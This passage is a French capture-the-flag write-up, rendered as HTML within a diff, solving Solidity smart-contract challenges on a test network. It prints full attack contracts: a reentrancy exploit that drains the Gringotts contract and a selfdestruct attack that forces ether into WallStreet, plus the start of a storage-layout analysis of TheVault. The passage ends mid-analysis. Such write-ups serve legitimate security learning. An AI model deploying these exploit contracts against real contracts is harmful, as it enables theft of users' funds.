+<span class="nx">contract</span><span class="p">.</span><span class="nx">alreadyWithdrawn</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="kc">false</span>
+</code></pre></div></div>
+
+<p>On récupère les valeurs de toutes les variables. On comprend alors qu’une quantité de <code class="highlighter-rouge">100</code>est disponible, et que cette dernière est distribuée par morceaux de <code class="highlighter-rouge">10</code>.</p>
+
+<p>Essayons alors de récupérer une part:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// solde</span>
+<span class="nx">contract</span><span class="p">.</span><span class="nx">availableAllowance</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">100</span>
+
+<span class="c1">// récupérons une part</span>
+<span class="nx">contract</span><span class="p">.</span><span class="nx">withdrawAllowance</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+
+<span class="c1">// solde</span>
+<span class="nx">contract</span><span class="p">.</span><span class="nx">availableAllowance</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">90</span>
+</code></pre></div></div>
+
+<p>Le solde a bien diminué, il est passé de <code class="highlighter-rouge">100</code> à <code class="highlighter-rouge">90</code>, on a retiré une part.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span><span class="p">.</span><span class="nx">numberOfWithdrawls</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">1</span>
+
+<span class="nx">contract</span><span class="p">.</span><span class="nx">alreadyWithdrawn</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="kc">true</span>
+</code></pre></div></div>
+
+<p>Le nombre de retraits a été incrémenté, et <code class="highlighter-rouge">alreadyWithdrawn</code>est passé à <code class="highlighter-rouge">true</code>.</p>
+
+<p>La seule manière de redemander une part est de remettre <code class="highlighter-rouge">alreadyWithdrawn</code> à <code class="highlighter-rouge">false</code>.</p>
+
+<p>Pour cela, il faut respecter la condition suivante:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">require</span><span class="p">(</span><span class="nx">now</span> <span class="o">&gt;=</span> <span class="nx">startStudyDate</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">*</span> <span class="mi">365</span> <span class="nx">days</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Il faut donc patienter un an…</p>
+
+<h2 id="attack-2">Attack</h2>
+
+<p>La seule fonction que nous pouvons attaquer est <code class="highlighter-rouge">withdrawAllowance()</code>. Les fonctions <code class="highlighter-rouge">donateToSorcery()</code>et <code class="highlighter-rouge">queryCreditOfSorcery()</code>ne faisant pas grand chose d’intéressant.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">withdrawAllowance</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">isEligible</span> <span class="p">{</span>
+  <span class="nx">require</span><span class="p">(</span><span class="nx">alreadyWithdrawn</span> <span class="o">==</span> <span class="kc">false</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="nx">availableAllowance</span> <span class="o">&gt;=</span> <span class="nx">allowancePerYear</span><span class="p">){</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">value</span><span class="p">(</span><span class="nx">allowancePerYear</span><span class="p">)()){</span>
+      <span class="nx">alreadyWithdrawn</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nx">numberOfWithdrawls</span> <span class="o">=</span> <span class="nx">numberOfWithdrawls</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="nx">sorceryAllowance</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="o">-=</span> <span class="nx">allowancePerYear</span><span class="p">;</span>
+    <span class="nx">availableAllowance</span><span class="o">-=</span><span class="nx">allowancePerYear</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>On ne peut pas attaquer le <code class="highlighter-rouge">require()</code>, la condition <code class="highlighter-rouge">availableAllowance &gt;= allowancePerYear</code>, n’est pas un problème. On peut commencer à chercher sur <code class="highlighter-rouge">msg.sender.call.value(allowancePerYear)()</code>.</p>
+
+<p>En cherchant sur Google: <code class="highlighter-rouge">msg.sender.call.value</code>. On tombe sur la vulnérabilité Re-Entrancy.</p>
+
+<blockquote>
+  <ul>
+    <li><a href="https://solidity.readthedocs.io/en/v0.6.0/security-considerations.html#re-entrancy">Security Considerations - Re-Entrancy</a></li>
+    <li><a href="https://hackernoon.com/smart-contract-security-part-1-reentrancy-attacks-ddb3b2429302">Re-entrancy Attacks</a></li>
+    <li><a href="https://consensys.github.io/smart-contract-best-practices/known_attacks/">Known Attacks</a></li>
+    <li><a href="https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4">Example Of An Attack Contract</a></li>
+  </ul>
+</blockquote>
+
+<p>Voici le code de l’attaque:</p>
+
+<blockquote>
+  <p>Il faut penser à recréer une nouvelle instance du challenge, car la précédente est bloquée, <code class="highlighter-rouge">alreadyWithdrawn</code> étant à <code class="highlighter-rouge">true</code>.</p>
+</blockquote>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">&gt;=</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">22</span> <span class="o">&lt;</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Gringotts</span> <span class="p">{</span>
+  <span class="c1">// tous le code du contrat</span>
+<span class="p">}</span>
+
+<span class="nx">contract</span> <span class="nx">Attack</span> <span class="p">{</span>
+    
+  	<span class="nx">address</span> <span class="nx">target</span> <span class="o">=</span> <span class="mh">0xb5718566197aB563FF468e03D6B9eb6F76627cF0</span><span class="p">;</span> <span class="c1">// adresse de la nouvelle instance du smart contract</span>
+    <span class="nx">Gringotts</span> <span class="kr">public</span> <span class="nx">g</span><span class="p">;</span>
+    
+    <span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">g</span> <span class="o">=</span> <span class="nx">Gringotts</span><span class="p">(</span><span class="nx">target</span><span class="p">);</span>
+    <span class="p">}</span>
+   
+    <span class="kd">function</span> <span class="nx">collect</span><span class="p">()</span> <span class="nx">payable</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">g</span><span class="p">.</span><span class="nx">donateToSorcery</span><span class="p">.</span><span class="nx">value</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">)(</span><span class="k">this</span><span class="p">);</span>
+        <span class="nx">g</span><span class="p">.</span><span class="nx">withdrawAllowance</span><span class="p">();</span>
+    <span class="p">}</span>
+    
+    <span class="kd">function</span> <span class="nx">kill</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">selfdestruct</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="p">()</span> <span class="nx">payable</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">g</span><span class="p">).</span><span class="nx">balance</span> <span class="o">&gt;=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">g</span><span class="p">.</span><span class="nx">withdrawAllowance</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>le constructeur va initialiser notre smart contrat déjà existant qui se trouve à l’adresse <code class="highlighter-rouge">target</code>.</p>
+  </li>
+  <li>
+    <p><code class="highlighter-rouge">collect()</code> va mettre en place l’attaque Re-Entrancy.</p>
+  </li>
+  <li>
+    <p>la fallback function sera exécutée tant qu’il y a encore des ethers a dérober.</p>
+  </li>
+  <li>
+    <p><code class="highlighter-rouge">kill()</code>va detruire le smart contract <code class="highlighter-rouge">Attack</code>et envoyer les ethers au créateur de la transaction.</p>
+  </li>
+</ul>
+
+<blockquote>
+  <p><a href="https://solidity.readthedocs.io/en/v0.4.21/introduction-to-smart-contracts.html">Introduction to Smart Contracts</a></p>
+
+  <p>The only possibility that code is removed from the blockchain is when a contract at that address performs the <code class="highlighter-rouge">selfdestruct</code> operation. The remaining Ether stored at that address is sent to a designated target and then the storage and code is removed from the state.</p>
+</blockquote>
+
+<p>Pour mettre en place l’attaque, nous allons utiliser <a href="https://remix.ethereum.org">Remix</a>, créer par exemple le fichier <code class="highlighter-rouge">Attack.sol</code>, y mettre tout le code précédent, le compiler. Déployer ensuite une instance de <code class="highlighter-rouge">Attack.sol</code> dans l’environnement <code class="highlighter-rouge">Injected Web3</code>. Patienter, et lancer la méthode <code class="highlighter-rouge">collect()</code> afin que notre instance de <code class="highlighter-rouge">Attack.sol</code>dérobe tout les ethers, attendre la fin de la transaction. Puis <code class="highlighter-rouge">kill()</code> pour récupérer ce que l’on vient de dérober dans notre wallet.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span><span class="p">.</span><span class="nx">availableAllowance</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">0</span>
+</code></pre></div></div>
+
+<p>Après l’attaque, tous les ethers sont récupérés depuis le smart contract. On demande alors le flag.</p>
+
+<p><code class="highlighter-rouge">SANTA{R3eN7r4ncY_f0r_Th3_WiN}</code></p>
+
+<h1 id="level-4---wallstreet">Level 4 - WallStreet</h1>
+
+<p><strong>Points</strong>: 400</p>
+
+<hr />
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">WallStreet</span> <span class="p">{</span>
+    <span class="nx">uint256</span> <span class="nx">stockExchangeAmount</span><span class="p">;</span>
+    <span class="nx">address</span> <span class="nx">contractOwner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+    <span class="nx">uint256</span> <span class="nx">collectFundsDate</span> <span class="o">=</span> <span class="nx">now</span> <span class="o">+</span> <span class="mi">14600</span> <span class="nx">days</span><span class="p">;</span>
+    <span class="nx">uint256</span> <span class="nx">lostMoneyAmount</span><span class="p">;</span>
+
+    <span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
+        <span class="nx">stockExchangeAmount</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="kd">function</span> <span class="nx">receiveMoneyAmount</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">stockExchangeAmount</span> <span class="o">-</span> <span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nx">withdrawMoney</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">contractOwner</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">now</span> <span class="o">&lt;</span> <span class="nx">collectFundsDate</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">uint256</span> <span class="nx">lostClientMoney</span> <span class="o">=</span> <span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
+            <span class="nx">lostMoneyAmount</span> <span class="o">=</span> <span class="nx">lostMoneyAmount</span> <span class="o">+</span> <span class="nx">lostClientMoney</span><span class="p">;</span>
+            <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span> <span class="o">-</span> <span class="nx">lostClientMoney</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span> <span class="o">+</span> <span class="mi">100</span> <span class="nx">ether</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    
+    <span class="kd">function</span> <span class="nx">getStockExchangeAmount</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint256</span> <span class="nx">amount</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">stockExchangeAmount</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="kd">function</span> <span class="nx">dateOfCollection</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint256</span> <span class="nx">date</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">collectFundsDate</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="analyse-3">Analyse</h2>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">withdrawMoney</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+  <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">contractOwner</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">now</span> <span class="o">&lt;</span> <span class="nx">collectFundsDate</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">uint256</span> <span class="nx">lostClientMoney</span> <span class="o">=</span> <span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
+    <span class="nx">lostMoneyAmount</span> <span class="o">=</span> <span class="nx">lostMoneyAmount</span> <span class="o">+</span> <span class="nx">lostClientMoney</span><span class="p">;</span>
+    <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span> <span class="o">-</span> <span class="nx">lostClientMoney</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span> <span class="o">+</span> <span class="mi">100</span> <span class="nx">ether</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Pas besoin de comprendre ce que fait exactement cette fonction. On sait juste qu’elle envoi des ethers,   mais seulement au propriétaire (<code class="highlighter-rouge">contractOwner</code>) du smart contract.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">getStockExchangeAmount</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint256</span> <span class="nx">amount</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="nx">stockExchangeAmount</span><span class="p">;</span>
+<span class="p">}</span>
+    
+<span class="kd">function</span> <span class="nx">dateOfCollection</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint256</span> <span class="nx">date</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="nx">collectFundsDate</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">getStockExchangeAmount()</code>et <code class="highlighter-rouge">dateOfCollection()</code>sont des accesseurs.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">abi</span> <span class="o">=</span> <span class="p">[{</span> <span class="s2">"constant"</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="p">...</span> <span class="p">}];</span> <span class="c1">// ABI</span>
+<span class="kd">var</span> <span class="nx">contractAddr</span> <span class="o">=</span> <span class="s2">"0x93202aaa272f2eBd6DEC0e32864f943C4A7d3CF0"</span><span class="p">;</span> <span class="c1">// adresse d'instance</span>
+<span class="kd">var</span> <span class="nx">contract</span> <span class="o">=</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">contract</span><span class="p">(</span><span class="nx">abi</span><span class="p">).</span><span class="nx">at</span><span class="p">(</span><span class="nx">contractAddr</span><span class="p">);</span>
+</code></pre></div></div>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span><span class="p">.</span><span class="nx">getStockExchangeAmount</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">100</span>
+
+<span class="nx">contract</span><span class="p">.</span><span class="nx">dateOfCollection</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">2838556020</span>
+</code></pre></div></div>
+
+<h2 id="attack-3">Attack</h2>
+
+<p>Ici, l’attaque à mettre en place est <code class="highlighter-rouge">selfdestruct()</code>, qui va nous permettre de récupérer les ethers du smart contract.</p>
+
+<blockquote>
+  <ul>
+    <li><a href="https://hackernoon.com/hackpedia-16-solidity-hacks-vulnerabilities-their-fixes-and-real-world-examples-f3210eba5148">Self Destruct / Suicide</a></li>
+    <li><a href="https://medium.com/coinmonks/smart-contract-exploits-part-2-featuring-capture-the-ether-math-31a289da0427">Retirement Fund</a></li>
+    <li><a href="https://solidity.readthedocs.io/en/v0.4.24/contracts.html#fallback-function">Fallback function</a></li>
+  </ul>
+</blockquote>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">24</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Attack</span> <span class="p">{</span>
+    <span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">==</span> <span class="mf">1.1</span> <span class="nx">ether</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="kd">function</span> <span class="nx">kill</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">selfdestruct</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="mh">0x6f7b35Bcf2f96F4EECF7121A8d4d6CE4E74497eC</span><span class="p">));</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>On va passer en paramètre de <code class="highlighter-rouge">selfdestruct()</code>, l’adresse du smart contract.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span><span class="p">.</span><span class="nx">receiveMoneyAmount</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+</code></pre></div></div>
+
+<p>On peut alors récupérer les fonds en appelant le fonction <code class="highlighter-rouge">receiveMoneyAmount()</code>.</p>
+
+<p>On demande alors la flag.</p>
+
+<p><code class="highlighter-rouge">SANTA{¡¡0v3rFl0ws_4r3_Ins4N3!!}</code></p>
+
+<h1 id="level-5---thevault">Level 5 - TheVault</h1>
+
+<p><strong>Points</strong>: 500</p>
+
+<hr />
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">&gt;=</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">17</span> <span class="o">&lt;</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">TheVault</span> <span class="p">{</span>
+    <span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">moneyAmount</span><span class="p">;</span>
+    <span class="nx">uint256</span><span class="p">[]</span> <span class="nx">savingAccounts</span><span class="p">;</span>
+    
+    <span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span><span class="p">{</span>
+        <span class="nx">moneyAmount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="kd">function</span> <span class="nx">putMoneyOnAccount</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">accountNumber</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">moneyQuantity</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">savingAccounts</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;=</span> <span class="nx">accountNumber</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">savingAccounts</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="nx">accountNumber</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nx">savingAccounts</span><span class="p">[</span><span class="nx">accountNumber</span><span class="p">]</span> <span class="o">=</span> <span class="nx">moneyQuantity</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="kd">function</span> <span class="nx">withdrawMoneyFromAccount</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">accountNumber</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">moneyAmount</span> <span class="o">&gt;=</span> <span class="mi">2000000</span> <span class="o">&amp;&amp;</span> <span class="nx">savingAccounts</span><span class="p">[</span><span class="nx">accountNumber</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nx">getMoneyFromAccount</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">accountNumber</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint256</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">savingAccounts</span><span class="p">[</span><span class="nx">accountNumber</span><span class="p">];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Notre objectif dans ce code est d’exécuter la fonction <code class="highlighter-rouge">withdrawMoneyFromAccount()</code>. Le problème est que le <code class="highlighter-rouge">require()</code> qui se trouve à l’intérieur nous oblige à avoir <code class="highlighter-rouge">moneyAmount &gt;= 2000000</code>, alors que <code class="highlighter-rouge">moneyAmount</code> n’est jamais modifié, il vaut par défaut <code class="highlighter-rouge">0</code>.</p>
+
+<h4 id="comment-fonctionne-lallocation-de-la-mémoire-dans-les-smart-constracts-">Comment fonctionne l’allocation de la mémoire dans les smart constracts ?</h4>
+
+<blockquote>
+  <ul>
+    <li><a href="https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/">Ethereum Smart Contract Storage</a></li>
+  </ul>
+</blockquote>
+
+<p>Le tableau <code class="highlighter-rouge">savingAccounts</code>stock sa taille dans le slot 1.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>myth read-storage <span class="nt">--rpc</span> infura-ropsten 1 0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5
+1: 0x0000000000000000000000000000000000000000000000000000000000000000
+</code></pre></div></div>
+
+<blockquote>
+  <p><a href="https://github.com/ConsenSys/mythril">Mythril</a></p>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Usage: <span class="nv">$ </span>myth read-storage <span class="nt">--rpc</span> infura-ropsten slot_number contract_addr
+</code></pre></div>  </div>
+</blockquote>
+
+<p>Pour le moment, le table est vide. Essayons d’ajouter un élément avec la fonction <code class="highlighter-rouge">putMoneyOnAccount()</code>.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">abi</span> <span class="o">=</span> <span class="p">[</span> <span class="p">{</span> <span class="s2">"constant"</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="p">...</span> <span class="p">}</span> <span class="p">];</span> <span class="c1">// ABI</span>
+<span class="kd">var</span> <span class="nx">contractAddr</span> <span class="o">=</span> <span class="s2">"0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5"</span><span class="p">;</span> <span class="c1">// adresse d'instance</span>
+<span class="kd">var</span> <span class="nx">contract</span> <span class="o">=</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">contract</span><span class="p">(</span><span class="nx">abi</span><span class="p">).</span><span class="nx">at</span><span class="p">(</span><span class="nx">contractAddr</span><span class="p">);</span>
+</code></pre></div></div>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// compte vide</span>
+<span class="nx">contract</span><span class="p">.</span><span class="nx">getMoneyFromAccount</span><span class="p">(</span><span class="s2">"0x123"</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">0</span>
+
+<span class="c1">// on ajoute une quantité de 0x16 à savingAccounts[0x123]</span>
